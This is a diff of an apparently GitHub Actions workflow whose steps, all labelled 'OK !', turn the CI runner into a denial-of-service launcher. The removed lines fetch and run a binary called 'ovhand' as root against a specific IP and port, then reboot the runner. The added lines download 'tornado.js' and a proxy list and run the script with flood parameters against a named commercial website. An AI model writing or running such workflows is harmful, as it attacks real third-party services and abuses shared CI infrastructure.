@@ -15,20 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/6lgFW/ovhand -O ovhand
-          chmod +x ovhand
-          PIDS=()
-          for i in {1..4}; do
-            sudo timeout 40 ./ovhand 152.228.155.67 22001 10 40 &
-            PIDS+=($!)
-          done
+          wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
+          wget https://up.zip/v1nnk/proxies.txt
+          npm i hpack
+          timeout 50 node tornado.js GET https://perfectpanel.com/ 50 10 90 proxies.txt --full --query 3
           
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
       - name: OK !
-        run: sleep 40
-        
-      - name: OK !
-        run: sudo reboot
+        run: |
+          sleep 50
+          exit 0
